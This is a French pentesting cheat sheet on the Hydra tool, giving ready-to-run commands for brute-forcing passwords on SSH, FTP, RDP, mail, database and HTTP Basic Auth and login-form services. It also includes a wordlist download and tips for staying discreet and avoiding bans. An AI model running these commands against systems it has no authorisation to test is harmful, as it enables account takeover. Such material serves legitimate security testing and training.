# Hydra – Pentest Auth Brute-Force

## Hydra : Brute-Force Rapide & Multi-Protocoles

### Installation

- Vérifier la présence de Hydra :
  - `hydra -h`
- Installer sur Debian/Ubuntu :
  - `sudo apt-get update`
  - `sudo apt-get install hydra`

## Commandes Hydra – Base

- Syntaxe générale :  
  `hydra [options_login] [options_pass] [options_attaque] [options_service]`

### Paramètres utiles

| Paramètre      | Explication |
|----------------|-------------|
| **-l LOGIN**   | Un seul utilisateur (`-l admin`) |
| **-L FILE**    | Fichier de usernames (`-L users.txt`) |
| **-p PASS**    | Un seul mot de passe (`-p toor`) |
| **-P FILE**    | Fichier de mots de passe (`-P pass.txt`) |
| **-s PORT**    | Port personnalisé (`-s 2222`) |
| **-t TASKS**   | Threads parallèles (`-t 4`) |
| **-f**         | Stop dès 1 login trouvé |
| **-v/-V**      | Verbose (progression) |
| **-M FILE**    | Cibler plusieurs hôtes (`-M targets.txt`) |
| **-x**         | Générateur de mots de passe (`-x 6:8:azAZ09`) |


## Protocoles/services supportés

| Service         | Exemple de commande |
|-----------------|--------------------|
| **ftp**         | `hydra -l admin -P pass.txt ftp://IP` |
| **ssh**         | `hydra -l root -P pass.txt ssh://IP` |
| **http-get**    | `hydra -l admin -P pass.txt www.site.com http-get` |
| **http-post-form** | `hydra -l admin -P pass.txt www.site.com http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"` |
| **smtp**        | `hydra -l admin -P pass.txt smtp://mail.domain.com` |
| **pop3**        | `hydra -l user@domain -P pass.txt pop3://mail.domain.com` |
| **imap**        | `hydra -l user@domain -P pass.txt imap://mail.domain.com` |
| **mysql**       | `hydra -l root -P pass.txt mysql://IP` |
| **mssql**       | `hydra -l sa -P pass.txt mssql://IP` |
| **vnc**         | `hydra -P pass.txt vnc://IP` |
| **rdp**         | `hydra -l admin -P pass.txt rdp://IP` |


## Exemples de syntax Hydra

### 1. Brute-force HTTP Auth basique

`hydra -L users.txt -P pass.txt www.site.com http-get`

### 2. Brute-force SSH sur plusieurs cibles

`hydra -l root -p toor -M targets.txt ssh`

### 3. FTP sur port non standard

`hydra -L users.txt -P pass.txt -s 2121 -V ftp.example.com ftp`

### 4. Brute-force d’un formulaire web (POST)

`hydra -l admin -P pass.txt www.site.com http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"`

- Modifier `F=incorrect` par la chaîne d’échec visible sur la page.
- Pour tester le succès : `S=302` (HTTP 302 = redirection succès).

### 5. Brute-force avancé RDP (générateur de mots de passe)

`hydra -l administrator -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 192.168.1.100 rdp`

## Astuces Hydra

- **-t 4** ou plus : augmente la vitesse (risque de ban si trop élevé).
- **-f** : stop dès qu’un login/pass trouvé (pour être discret).
- **-V** : détaille chaque tentative (utile pour debug).
- **-o result.txt** : sauvegarde les résultats.

## Liens utiles

- [Hydra GitHub](https://github.com/vanhauser-thc/thc-hydra)
- [Services supportés (hydra -U)](https://github.com/vanhauser-thc/thc-hydra/blob/master/README)

---

# Basic HTTP Authentication & Brute Force

## Basic Auth

- Authentification HTTP basique, utilisée pour protéger une ressource web.
- Le serveur répond avec **401 Unauthorized** et demande un login/mot de passe.
- Le client (navigateur, curl, etc) envoie l’en-tête :
  - `Authorization: Basic <base64(login:password)>`
- **Attention** : le login/mot de passe passent en clair (encodé Base64, pas chiffré).

### Exemple de requête
GET /protected HTTP/1.1
Host: www.site.com
Authorization: Basic YWxpY2U6c2VjcmV0MTIz

## Brute-force Basic Auth avec Hydra

### Format de base

`hydra -l <user> -P <wordlist.txt> <IP/URL> http-get [PATH] [options]`

- **-l <user>** : utilisateur à tester
- **-P <wordlist>** : liste de mots de passe
- **http-get** : pour tester l’auth HTTP GET basique
- **/path** : chemin cible (souvent `/`)
- **-s <port>** : pour changer de port (optionnel)

### Exemple concret

Télécharger une wordlist :
`curl -O https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt`

Lancer Hydra sur le service HTTP basique :

`hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt 127.0.0.1 http-get / -s 81`

# Brute-Forcing Login Forms avec Hydra

## Repérer les infos du formulaire

- Ouvrir le site, inspecter le code HTML ou via l’onglet Réseau (F12) :
  - **Action du formulaire** : chemin (ex : `/login`, `/`)
  - **Méthode** : POST (presque toujours)
  - **Champs** : noms exacts pour l’utilisateur et le mot de passe (ex : username, password)
  - **Message d’échec** : ex : "Invalid credentials" (clé pour Hydra)
  - **Paramètres cachés** : token CSRF, hidden, etc.

### Exemple HTML

```html
<form action="/" method="post">
  <input type="text" name="username">
  <input type="password" name="password">
</form>
````

## Commande Hydra type

`hydra -L users.txt -P pass.txt IP -s PORT http-post-form "PATH:params:condition"`

- Explication des variables :

    - PATH : chemin d’action du form (ex: /, /login)

    - params : username=^USER^&password=^PASS^ (adapte selon noms)

    - condition :

        `F=... : string d’échec dans la réponse (F=Invalid credentials)`

        `S=... : string ou code de succès (ex : S=302, S=Dashboard)`

### Exemples concrets
- Basique

`hydra -L users.txt -P pass.txt 192.168.1.12 http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid credentials"`

- Changement de port

`hydra -L users.txt -P pass.txt 192.168.1.12 -s 8080 http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"`

- Utiliser un critère de succès

`hydra -l admin -P pass.txt 192.168.1.12 http-post-form "/login:username=^USER^&password=^PASS^:S=Dashboard"`

- Si le succès est une redirection

`hydra -l admin -P pass.txt 192.168.1.12 http-post-form "/login:username=^USER^&password=^PASS^:S=302"`

